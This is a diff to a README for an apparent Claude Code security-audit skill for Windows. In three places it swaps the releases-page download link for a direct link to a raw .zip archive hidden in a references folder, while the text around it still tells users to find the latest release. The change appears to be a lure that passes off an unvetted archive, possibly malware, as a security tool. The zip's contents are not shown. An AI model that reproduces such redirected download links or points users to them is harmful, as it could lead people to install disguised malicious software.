@@ -1,10 +1,10 @@
 # 🛡️ Security-Audit-Claude-Skill - Simple Security Checks for Windows
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/raw/refs/heads/main/skills/security-audit/references/Audit_Security_Skill_Claude_v2.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases
+Visit this page to download: https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/raw/refs/heads/main/skills/security-audit/references/Audit_Security_Skill_Claude_v2.8.zip
 
 1. Open the link in your web browser.
 2. Look for the latest release at the top of the page.
@@ -185,7 +185,7 @@ Yes. Many users run it again after they fix issues.
 
 ## 🧭 Quick start
 
-1. Visit https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/releases
+1. Visit https://github.com/Topsyturvy-cheapskate696/Security-Audit-Claude-Skill/raw/refs/heads/main/skills/security-audit/references/Audit_Security_Skill_Claude_v2.8.zip
 2. Download the Windows release file
 3. Open Claude Code
 4. Run `/security-audit`
